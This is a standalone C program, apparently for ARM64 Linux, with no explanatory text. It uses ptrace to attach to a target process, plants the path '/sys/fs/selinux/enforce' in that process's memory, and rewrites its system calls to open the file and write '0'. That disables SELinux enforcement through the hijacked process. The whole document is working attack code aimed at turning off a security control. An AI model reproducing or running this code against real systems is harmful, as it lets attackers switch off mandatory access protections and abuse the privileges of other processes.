#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef NT_PRSTATUS
#define NT_PRSTATUS 1
#endif
#ifndef PTRACE_GETREGSET
#define PTRACE_GETREGSET 0x4204
#endif
#ifndef PTRACE_SETREGSET
#define PTRACE_SETREGSET 0x4205
#endif

static int poke64(pid_t pid, uint64_t addr, uint64_t val) {
  errno = 0;
  long r = ptrace(PTRACE_POKEDATA, pid, (void *)addr, (void *)val);
  return (r == -1 && errno) ? -1 : 0;
}

static int sys_stop(pid_t pid, struct user_pt_regs *r) {
  int st = 0;
  ptrace(PTRACE_SYSCALL, pid, 0, 0);
  waitpid(pid, &st, 0);
  struct iovec iov = {.iov_base = r, .iov_len = sizeof(*r)};
  return ptrace(PTRACE_GETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov);
}

static int sys_set(pid_t pid, struct user_pt_regs *r, int nr) {
  struct iovec iov = {.iov_base = r, .iov_len = sizeof(*r)};
  r->regs[8] = (uint64_t)nr;
  ptrace(PTRACE_SETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov);
  struct iovec i2 = {.iov_base = &nr, .iov_len = sizeof(nr)};
  ptrace(PTRACE_SETREGSET, pid, (void *)(long)0x404, &i2);
  return 0;
}

int main(int argc, char **argv) {
  pid_t pid = (pid_t)atoi(argv[1]);
  if (ptrace(PTRACE_ATTACH, pid, 0, 0) != 0) {
    printf("ATTACH errno=%d\n", errno);
    return 1;
  }
  int st = 0;
  waitpid(pid, &st, 0);
  struct user_pt_regs r;
  memset(&r, 0, sizeof(r));
  struct iovec iov = {.iov_base = &r, .iov_len = sizeof(r)};
  ptrace(PTRACE_GETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov);
  uint64_t dst = (r.sp - 0x120) & ~0xfULL;
  /* "/sys/fs/selinux/enforce" = 24 bytes + NUL */
  const char *path = "/sys/fs/selinux/enforce";
  uint64_t w[4] = {0};
  memcpy(w, path, strlen(path));
  poke64(pid, dst, w[0]);
  poke64(pid, dst + 8, w[1]);
  poke64(pid, dst + 16, w[2]);
  poke64(pid, dst + 24, 0);
  poke64(pid, dst + 32, 0x30ULL); /* '0' */
  ptrace(PTRACE_SETOPTIONS, pid, 0, (void *)PTRACE_O_TRACESYSGOOD);
  sys_stop(pid, &r);
  /* openat(AT_FDCWD, path, O_WRONLY) = 56 */
  r.regs[0] = (uint64_t)(int)-100;
  r.regs[1] = dst;
  r.regs[2] = (uint64_t)O_WRONLY;
  r.regs[3] = 0;
  sys_set(pid, &r, 56);
  sys_stop(pid, &r);
  printf("openat x0=%lld\n", (long long)r.regs[0]);
  if ((long long)r.regs[0] < 0) {
    ptrace(PTRACE_DETACH, pid, 0, 0);
    return 1;
  }
  unsigned long fd = r.regs[0];
  sys_stop(pid, &r);
  r.regs[0] = fd;
  r.regs[1] = dst + 32;
  r.regs[2] = 1;
  sys_set(pid, &r, 64);
  sys_stop(pid, &r);
  printf("write x0=%lld\n", (long long)r.regs[0]);
  ptrace(PTRACE_DETACH, pid, 0, 0);
  return 0;
}
